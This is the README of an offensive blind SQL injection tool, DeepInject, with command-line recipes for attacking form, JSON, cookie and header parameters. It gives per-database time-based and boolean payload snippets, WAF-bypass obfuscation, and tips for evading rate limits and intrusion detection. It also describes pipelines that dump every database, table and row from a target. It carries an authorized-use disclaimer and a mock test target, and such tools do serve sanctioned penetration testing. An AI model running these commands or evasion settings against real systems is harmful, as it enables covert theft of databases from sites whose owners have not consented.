# DeepInject

Advanced Blind SQL Injection Research Framework

```
  _____                 _____       _           _
 |  __ \               |_   _|     (_)         | |
 | |  | | ___  ___ _ __  | |  _ __  _  ___  ___| |_
 | |  | |/ _ \/ _ \ '_ \ | | | '_ \| |/ _ \/ __| __|
 | |__| |  __/  __/ |_) || |_| | | | |  __/ (__| |_
 |_____/ \___|\___| .__/_____|_| |_| |\___|\___|\__|
                  | |             _/ |
                  |_|            |__/

  v2.1  |  Author : Zaky Nour Rizqy (JackTekno)
```

> **For authorized penetration testing and security research only.**
> Only use on systems you own or have explicit written permission to test.

---

## Features

- **Multiple injection types** — `multipart/form-data`, `form`, `json`, `GET`, `cookie`, `header`
- **Two inference techniques + auto-select** — time-based delays and boolean-based
  response diffing; `--technique auto` measures which one the target actually answers
- **Native payloads per DBMS** — every `--payload-style` has a real MySQL / MSSQL /
  PostgreSQL / Oracle / SQLite implementation (stacked `WAITFOR`, `PG_SLEEP`,
  `DBMS_PIPE.RECEIVE_MESSAGE`, recursive-CTE SQLite) instead of MySQL-only syntax
- **8 payload wrapper styles** — including double-query XOR that bypasses WAFs which block sqlmap
- **WAF bypass & obfuscation** — space substitution, case mixing, inline comment splitting (levels 0–3)
- **Auto-detect** — automatically finds a working payload style for the selected DBMS
- **Full DB enumeration** — databases → tables → columns → data dump
- **`--dump-all` pipeline** — one command walks databases → tables → columns → rows
  and can emit one JSON file per table plus a manifest (`--dump-dir`)
- **Checkpoint / resume** — every answered condition, length, character and row is
  persisted to `--state FILE`; `Ctrl-C` is safe and `--resume` continues for free
- **Rate limiting** — `--delay` / `--sleep-jitter` to stay under WAF and IDS thresholds
- **Server fingerprint** — version, current user, hostname, data directory, privileges
- **Table sizes** — row / size estimates per table
- **Binary search extraction** — ~7 requests per character, memoized so repeats are free
- **Parallel character extraction** — `--threads N` for faster results
- **Adaptive timing** — calibrate baseline, configurable sleep/threshold/retries
- **Live run statistics** — request count, req/s, latency, status codes, ETA per phase
- **Output formats** — `txt`, `json`, `jsonl`, `csv` with run metadata in every report
- **Non-interactive mode** — `-y` and automatic non-TTY detection for CI / cron
- **Custom query extraction** — run any SQL and extract the result
- **Test suite** — `python -m unittest discover -s tests` runs everything against a
  bundled mock vulnerable server (no external targets needed)

---

## Why not just sqlmap?

sqlmap is great, but it struggles with:

| Scenario | sqlmap | DeepInject |
|---|---|---|
| Complex multipart + file upload forms | Often fails to reconstruct correctly | Native `--file-fields` support |
| Custom payload wrapping required | Limited control | 8 named styles, pick manually or auto-detect |
| WAF tuned against sqlmap signatures | Detected | Double-query XOR style (style 6) evades most |
| Stacked parameter ordering | Inconsistent | Exact field order preserved |
| Long dump interrupted mid-run | Restarts the phase | Per-step checkpoint + `--resume` |
| Targets where `SLEEP()` is blocked | Time-based only | Falls back to boolean response diffing |

---

## What's new in v2.1

| Change | Why it matters |
|---|---|
| Per-DBMS payload registry (`PayloadFactory`) | Previously `--dbms pgsql/mssql/oracle/sqlite` still emitted MySQL `SLEEP()`, so non-MySQL targets never delayed |
| Boolean-based technique + `--technique auto` | Works on targets that strip sleep functions or where the DBMS sleep is too weak to observe |
| DBMS-correct `LENGTH` / `SUBSTRING` / `ASCII` | MSSQL needs a length argument; Oracle uses `SUBSTR`. Non-MySQL enumeration was silently empty before |
| Oracle enumeration maps | `--dbms oracle` had no `DB_NAME` / `TABLE_NAME` / `COL_NAME` entries at all |
| `--state` / `--resume` / `--fresh` | Multi-hour dumps no longer restart from zero after an interruption |
| `--dump-all` + `--dump-dir` | One command for a full database walk, with per-table artifacts; system schemas skipped automatically |
| `--delay`, `--sleep-jitter`, `--rand-agent` | Knobs to avoid tripping rate limits and UA heuristics |
| Stats, ETA and richer reports | `txt/json/jsonl/csv` now include run metadata and a request/throughput summary |
| `-y`, non-TTY detection, exit codes | Usable from scripts, cron and CI without hanging on prompts |

---

## Installation

```bash
git clone https://github.com/JackTekno/DeepInject
cd DeepInject
pip install requests
```

Or: `pip install -r requirements.txt`

Python 3.7+ required.

**Repository:** <https://github.com/JackTekno/DeepInject> · **Author:** Zaky Nour Rizqy (GitHub: [@JackTekno](https://github.com/JackTekno))

---

## Usage

```
python3 deepinject.py -u URL --type TYPE --param PARAM [options]
```

### Quick examples

**Multipart/form-data with file upload field**
```bash
python3 deepinject.py \
  -u "https://target.local/upload.php" \
  --type multipart \
  --param vulnerable_field \
  --fields "field1=value1,field2=value2" \
  --file-fields file_upload_field \
  --cookie "PHPSESSID=your_session" \
  --enum-db
```

**POST form (application/x-www-form-urlencoded)**
```bash
python3 deepinject.py \
  -u "https://target.local/search.php" \
  --type form \
  --param keyword \
  --fields "category=news" \
  --enum-tables --db target_db
```

**GET parameter**
```bash
python3 deepinject.py \
  -u "https://target.local/item.php" \
  --type get \
  --param id \
  --fingerprint --enum-db
```

**JSON API**
```bash
python3 deepinject.py \
  -u "https://target.local/api/search" \
  --type json \
  --param query \
  --json-body '{"query":"x","limit":10}' \
  --enum-tables --db target_db
```

**Cookie injection**
```bash
python3 deepinject.py \
  -u "https://target.local/dashboard" \
  --type cookie \
  --param user_token \
  --enum-db
```

---

## Workflow

```
1. Verify      --verify
2. Fingerprint --fingerprint
3. Enum DB     --enum-db
4. Enum Tables --enum-tables --db <db>
5. Enum Cols   --enum-columns --db <db> --table <tbl>
6. Dump Data   --dump --db <db> --table <tbl> --columns <col1,col2>
```

Or do the whole climb in one shot:

```bash
python3 deepinject.py -u URL --type get --param id \
  --dump-all --dump-limit 25 --dump-dir out/ \
  --state state.json -y -o full.json --fmt json
```

Engine schemas (`information_schema`, `mysql`, `pg_catalog`, …) are skipped by
`--dump-all` because walking them costs hours; pass `--exclude-db -` to include
them anyway, or `--exclude-db custom_a,custom_b` to skip different ones.

If it is interrupted (network, WAF, `Ctrl-C`), re-run the same command —
`--state state.json` makes DeepInject pick up exactly where it stopped:

```bash
python3 deepinject.py -u URL --type get --param id \
  --dump-all --state state.json --resume
```

---

## Techniques

`--technique` decides how a boolean SQL condition is turned into an observable signal.

| Value | Method | Use when |
|---|---|---|
| `auto` (default) | Probe time-based first; if no delay is measurable, measure TRUE/FALSE response fingerprints and switch to boolean-based | You do not know what the target tolerates |
| `time` | Delay payloads (`SLEEP`, `WAITFOR`, `pg_sleep`, ...) | Sleep functions reach the DB and the delay is observable |
| `bool` | Compare response length / word count / body hash for TRUE vs FALSE | Sleep is filtered, or the delay is too small/noisy to measure |

```bash
# Let DeepInject decide
python3 deepinject.py -u URL --type get --param id --technique auto --enum-db

# Force boolean-based with a custom TRUE/FALSE pair (must contain {c})
python3 deepinject.py -u URL --type get --param id --technique bool \
  --bool-template "1 AND ({c})|1 AND NOT ({c})"
```

Boolean calibration prints the measured diff score and the tolerance actually used,
so a run that "silently finds nothing" is visible instead of mysterious.

---

## Checkpoint & Resume

| Flag | Effect |
|---|---|
| `--state FILE` | JSON file holding every answer already paid for |
| `--resume` | Continue from `--state` (same thing happens implicitly: nothing is deleted) |
| `--fresh` | Delete `--state` and start over |
| `--state-clear` | Delete `--state` contents and exit |

What is cached: enumeration counts, string lengths, individual characters, whole
extracted strings, dumped rows, and every boolean condition answer. Running the
same command twice against an unchanged target costs **zero** additional requests
for the finished parts.

---

## Rate Limiting & Evasion

| Flag | Effect |
|---|---|
| `--delay 0.5` | Wait ≥0.5 s between requests |
| `--sleep-jitter 0.3` | Add a random 0–0.3 s on top of `--delay` (less robot-like) |
| `--rand-agent` | Rotate the `User-Agent` per request |
| `--obfuscate 0-3` | Space substitution → case mixing → inline comment splitting |
| `--payload-style N` | Choose the wrapper; unsupported styles for the DBMS fall back to style 0 |

---

## All Options

| Option | Default | Description |
|---|---|---|
| `-u URL` | required | Target URL |
| `--type` | `multipart` | Injection type: `multipart`, `form`, `json`, `get`, `cookie`, `header` |
| `--param` | required | Parameter name to inject |
| `--fields` | — | Extra form fields: `key1=val1,key2=val2` |
| `--file-fields` | — | File-upload fields in multipart: `file1,file2` |
| `--json-body` | — | JSON body string for `--type json` |
| `--technique` | `auto` | Inference technique: `auto`, `time`, `bool` |
| `--bool-template` | per-DBMS | Custom boolean payload pair: `TRUE_tpl|FALSE_tpl` (must contain `{c}`) |
| `--cookie` | — | Cookies: `key1=val1;key2=val2` |
| `-H HEADER` | — | Extra header (repeatable): `-H "Referer: ..."` |
| `--dbms` | `mysql` | Target DBMS: `mysql`, `mssql`, `pgsql`, `oracle`, `sqlite` |
| `--sleep` | `5` | SLEEP seconds for time-based detection |
| `--threshold` | `3.5` | Minimum elapsed time (s) to consider delayed |
| `--retries` | `3` | Retries per request |
| `--timeout` | `20` | HTTP request timeout |
| `--delay` | `0` | Minimum delay between requests (rate limit) |
| `--sleep-jitter` | `0` | Random extra 0–N s added to `--delay` |
| `--max-len` | `128` | Max string length to extract |
| `--threads` | `1` | Parallel threads for character extraction |
| `--obfuscate` | `0` | Obfuscation level 0–3 |
| `--payload-style` | `6` | Payload wrapper 0–7 (see DBMS matrix below) |
| `--proxy` | — | Proxy URL: `http://127.0.0.1:8080` |
| `--rand-agent` | — | Rotate `User-Agent` per request |
| `-v, --verbose` | — | Show HTTP status, size and elapsed time per request |
| `--auto-detect` | — | Auto-find working payload style |
| `--calibrate` | — | Measure baseline response time |
| `--verify` | — | Check vulnerability only, then exit |
| `--fingerprint` | — | Get server info (version, user, host, datadir) |
| `--enum-db` | — | List all databases |
| `--enum-tables` | — | List tables in `--db` |
| `--enum-columns` | — | List columns in `--db --table` |
| `--dump` | — | Dump rows from `--db --table --columns` |
| `--dump-all` | — | Full pipeline: databases → tables → columns → rows |
| `--exclude-db` | system schemas | Databases skipped by `--dump-all` (comma separated; `-` disables skipping) |
| `--dump-limit` | `50` | Max rows to dump per table |
| `--dump-dir` | — | Write one JSON file per table (+ `manifest.json`) with `--dump-all` |
| `--query` | — | Extract result of custom SQL query |
| `--stats` | — | Print the full JSON statistics block at the end |
| `--state FILE` | — | Checkpoint/resume state file |
| `--resume` | — | Resume from `--state` |
| `--fresh` | — | Delete `--state` before starting |
| `--state-clear` | — | Clear `--state` and exit |
| `-y, --yes` | — | Assume "yes" (non-interactive / CI) |
| `-o FILE` | — | Save output to file |
| `--fmt` | `txt` | Output format: `txt`, `json`, `jsonl`, `csv` |

### Exit codes

| Code | Meaning |
|---|---|
| `0` | Run completed (including "verified" and "aborted by the operator") |
| `1` | Target gave no usable signal |
| `2` | Invalid arguments / usage error |
| `130` | Interrupted with `Ctrl-C` (progress already flushed to `--state`) |

---

## Payload Styles (`--payload-style N`)

| # | Name | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|---|
| 0 | IF-SLEEP | `IF(c,SLEEP(n),0)` | `IF(c) WAITFOR DELAY` | `PG_SLEEP(n) WHERE c` | `DBMS_PIPE.RECEIVE_MESSAGE` | recursive CTE |
| 1 | SUBQUERY | nested subquery | stacked + subquery | `CASE WHEN` subquery | `CASE WHEN` | — |
| 2 | XOR | `1 XOR(IF(...)) XOR 1` | `1 XOR 1;IF ...` | `PG_SLEEP(CASE ...)` | `CASE WHEN` | — |
| 3 | CASE | `CASE WHEN c THEN SLEEP` | `CASE WHEN` + `WAITFOR` | `CASE WHEN` | `DBMS_PIPE.RECEIVE_MESSAGE` | recursive CTE in `CASE` |
| 4 | ELT/BLOB | `ELT(c,SLEEP(n))` | — | `GENERATE_SERIES` | — | `RANDOMBLOB(...)` |
| 5 | AND-SLEEP | `1 AND SLEEP(IF(...))` | `1;IF c WAITFOR` | `PG_SLEEP(CASE ...)` | `CASE WHEN ... =1` | recursive CTE |
| **6** | **DOUBLE-XOR** | double-query XOR comment | — | — | — | — |
| 7 | HEAVY | `BENCHMARK(...)` | stacked `WAITFOR` | `PG_SLEEP` | `DBMS_PIPE` | `RANDOMBLOB(...)` |

`—` means the style has no native form for that engine; DeepInject says so and
falls back to style 0 rather than sending syntax the server cannot parse.
Style 6 remains the default because it is the strongest MySQL WAF bypass.

---

## DBMS Support

| DBMS | Time-based | Boolean-based | Enumeration | Dump |
|---|---|---|---|---|
| MySQL | `SLEEP(n)` | Yes | Full (databases, tables, columns, sizes) | Yes |
| MSSQL | `WAITFOR DELAY` | Yes | Full | Yes |
| PostgreSQL | `pg_sleep(n)` | Yes | Tables in `public` | Yes |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE` | Yes | Users / tables / columns | Yes |
| SQLite | recursive CTE + `RANDOMBLOB` | Yes | Tables / columns / rows | Yes |

---

## Output Formats

```bash
# Save as JSON (includes _meta and stats sections)
python3 deepinject.py ... --dump -o result.json --fmt json

# Save as CSV (one table per section, written back to back)
python3 deepinject.py ... --dump -o result.csv --fmt csv

# Newline-delimited JSON — one record per line, ideal for pipelines / SIEM
python3 deepinject.py ... --enum-db -o result.jsonl --fmt jsonl

# Plain text
python3 deepinject.py ... --enum-db -o databases.txt --fmt txt

# Full database walk with per-table files
python3 deepinject.py ... --dump-all --dump-dir out/ -o summary.json --fmt json
```

Every report ends with a run metadata block:

```json
"_meta": {
  "tool": "DeepInject", "version": "2.1",
  "author": "Zaky Nour Rizqy", "github": "https://github.com/JackTekno",
  "repository": "https://github.com/JackTekno/DeepInject",
  "url": "...", "dbms": "mysql", "technique": "time", "payload_style": 0,
  "requests": 417, "elapsed_seconds": 231.6, "checkpoint_steps": 1284
}
```

---

## Testing

Everything is verified against a bundled mock SQLi target — no external system involved.

```bash
python -m unittest discover -s tests -v
```

The suite covers the payload factory (per-DBMS native syntax), obfuscation,
checkpoint reuse, fingerprint diffing, time-based and boolean-based extraction,
`--dump-all`, all report formats, resume behaviour and CLI validation. The mock
target can also be run standalone:

```bash
python tests/mock_server.py --port 8099 --dialect mysql
python3 deepinject.py -u http://127.0.0.1:8099/item.php --type get --param id \
  --sleep 1 --threshold 0.25 --technique time --enum-db
```

---
| 7 | BENCHMARK | `BENCHMARK(10000000,SHA1(1))` | CPU-based, no SLEEP |

---

## Obfuscation Levels (`--obfuscate N`)

| Level | Effect |
|---|---|
| 0 | No change |
| 1 | Space → `/**/` or `%09` |
| 2 | + keyword case mixing (`SeLeCt`, `SlEeP`) |
| 3 | + inline comment splitting (`SL/**/EEP`) |

---

## Tips

**Session expired / no signal detected:**
- Update `--cookie` with a fresh session
- Run `--auto-detect` to find a working payload style
- Use `--verbose` to see HTTP status, body size and elapsed times
- Run `--calibrate` to check the baseline response time
- Try `--technique bool` — targets that filter `SLEEP()` often still leak through response diffing

**Speed up extraction:**
```bash
--threads 4   # extract 4 chars in parallel
--sleep 3     # reduce sleep if the connection is stable
```

**Stay under the radar:**
```bash
--payload-style 6 --obfuscate 2 --delay 0.7 --sleep-jitter 0.4 --rand-agent
```

**Survive a long dump:**
```bash
--state state.json --dump-all --dump-dir out/
# later, after a drop or a Ctrl-C:
--state state.json --resume
```

**Typical dump pacing:** with `--sleep 5` and `--threads 1`, budget roughly 30–40 s per
column of a short string. Live ETA and req/s are printed with the final statistics block;
`--state` means nothing already extracted is ever re-requested.

---

## Disclaimer

This tool is intended for **authorized security testing, penetration testing engagements, CTF competitions, and security research only**.

Unauthorized use against systems you do not own or have explicit written permission to test is **illegal** and may result in criminal prosecution. The author assumes no liability for misuse.

---

## Author

**Zaky Nour Rizqy**

- GitHub: [JackTekno](https://github.com/JackTekno)
- Repository: [JackTekno/DeepInject](https://github.com/JackTekno/DeepInject)

---

## License

MIT License — see [LICENSE](LICENSE) for details.
